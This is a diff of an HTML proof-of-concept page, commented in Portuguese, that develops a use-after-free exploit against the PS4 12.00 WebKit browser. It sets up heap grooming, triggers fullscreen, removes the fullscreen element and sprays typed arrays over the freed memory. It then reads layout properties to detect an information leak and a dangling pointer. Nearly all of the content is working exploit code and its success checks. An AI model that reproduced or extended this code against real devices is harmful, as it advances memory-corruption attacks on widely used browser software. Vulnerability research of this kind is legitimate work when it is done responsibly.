@@ -2,35 +2,41 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - Gatilho Cirúrgico</title>
+<title>PS4 UAF - Info Leak Attempt</title>
+<style>
+    body { font-family: monospace; background-color: #111; color: #0f0; padding: 20px; font-size: 18px;}
+    #log { margin-top: 20px; white-space: pre-wrap; }
+    .alert { color: #ff3333; font-weight: bold; }
+    .leak { color: #ffff00; font-weight: bold; font-size: 24px;}
+</style>
 </head>
-<body style="background-color: #222; color: #fff;">
+<body>
 
-<h2>PS4 12.00 - UAF Confirmation (Teste Cirúrgico do Fullscreen)</h2>
-
-<button onclick="runTest()" style="padding: 10px; font-size: 16px;">Executar Teste: Destruição do Alvo</button>
-
-<div id="log"></div>
+<h2>PS4 12.00 - Info Leak Hunter</h2>
+<button onclick="runTest()" style="padding: 15px; font-size: 18px; cursor: pointer;">Executar Caça ao Leak</button>
+<div id="log">Aguardando início...</div>
 
 <script>
-const PATTERN = 2.121995791e-314;
+// Este padrão equivale a 0x4141414141414141 na memória.
+// Se lido como um inteiro de 32 bits (ex: clientWidth), deve retornar 1094795585
+const PATTERN = 2.121995791e-314; 
+const EXPECTED_LEAK = 1094795585;
 
 function runTest() {
     const log = document.getElementById("log");
-    log.innerHTML = "<p>Running... Press OPTIONS</p>";
+    log.innerHTML = "Preparando Heap...<br><b>Pressione OPTIONS agora!</b>";
 
     let controllers = [];
 
-    // Passo 1: Alocação (Heap Grooming)
+    // Passo 1: Heap Grooming
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
 
-    // PASSO NOVO: Criamos o alvo do Fullscreen em vez de usar o documentElement
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Tela Cheia Ativa<br>Pressione OPTIONS agora</h1>";
+    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Buscando Leaks...<br>Aperte OPTIONS</h1>";
     fsTarget.style.backgroundColor = "black";
     fsTarget.style.width = "100%";
     fsTarget.style.height = "100%";
@@ -39,22 +45,23 @@ function runTest() {
     fsTarget.style.left = "0";
     document.body.appendChild(fsTarget);
 
-    // Entra em Fullscreen usando o nosso alvo específico
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
-    } else {
-        document.documentElement.webkitRequestFullscreen?.();
     }
 
     window.onblur = function() {
+        log.innerHTML += "<br>[*] Foco perdido. Executando UAF...";
+
         // FORÇA GC
         controllers = null;
-
         for (let i = 0; i < 20000; i++) {
             new ArrayBuffer(0x10000);
         }
 
-        // Spray mantido (Essencial para sobrescrever o objeto C++ deletado)
+        // Gatilho do UAF: Removemos o elemento PRIMEIRO para liberar a memória
+        fsTarget.remove(); 
+        
+        // Fazemos o Spray IMEDIATAMENTE APÓS a remoção para ocupar o buraco fresco
         let spray = [];
         for(let i = 0; i < 8000; i++) {
             let p = new Float64Array(10);
@@ -62,25 +69,39 @@ function runTest() {
             spray.push(p);
         }
 
-        // Gatilho crítico Cirúrgico
+        // Tentativa de Info Leak (Sem causar o crash propositalmente)
         setTimeout(() => {
+            log.innerHTML += "<br>[*] Lendo memória corrompida...";
+            
             try {
-                // 1. Destruímos apenas o elemento hospedeiro da tela cheia!
-                // Isso cria o "dangling pointer" no Fullscreen Manager do WebCore.
-                fsTarget.remove(); 
+                // Tentamos ler propriedades que forçam o WebKit a acessar o objeto C++ que foi liberado e sobrescrito
+                let leakedWidth = fsTarget.clientWidth;
+                let leakedHeight = fsTarget.clientHeight;
+                let fsState = document.webkitFullscreenElement;
                 
-                // 2. Forçamos o WebKit a tentar resolver a saída da tela cheia agora que o elemento sumiu.
-                // Aqui é onde o WebKit deve tropeçar no seu PATTERN e crashar.
-                if (document.webkitIsFullScreen || document.fullscreenElement) {
-                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+                log.innerHTML += `<br>[*] Largura lida: ${leakedWidth}`;
+                log.innerHTML += `<br>[*] Altura lida: ${leakedHeight}`;
+                
+                // Verificação de Sucesso
+                if (leakedWidth === EXPECTED_LEAK || leakedHeight === EXPECTED_LEAK || leakedWidth > 100000) {
+                    log.innerHTML += `<br><span class="leak">[!!!] INFO LEAK DETECTADO: O valor lido foi derivado do nosso Spray!</span>`;
+                } else if (leakedWidth === 0) {
+                    log.innerHTML += `<br><span class="alert">[-] Falha: O WebKit retornou 0 (Tratou como objeto nulo de forma segura).</span>`;
+                } else {
+                    log.innerHTML += `<br>[-] Valor normal retornado. O ponteiro pode ter sido atualizado.`;
                 }
+                
+                // Verifica se o navegador ainda acha que o elemento destruído é o dono da tela cheia
+                if (fsState === fsTarget) {
+                    log.innerHTML += `<br><span class="leak">[!!!] PONTEIRO PENDURADO CONFIRMADO: WebKit ainda referencia o nó removido!</span>`;
+                }
+                
             } catch(e) {
-                console.log("[ERRO NO GATILHO]", e);
+                log.innerHTML += `<br><span class="alert">[ERRO] A leitura falhou ou o WebKit crashou ao tentar ler: ${e}</span>`;
             }
 
-            // O fallback caso sobreviva (não deve chegar aqui se o UAF funcionar)
-            setTimeout(() => location.reload(), 500);
-        }, 3000);
+            // Não chamamos exitFullscreen para não causar a tela azul, queremos ver os resultados no DOM
+        }, 1500);
     };
 }
 </script>
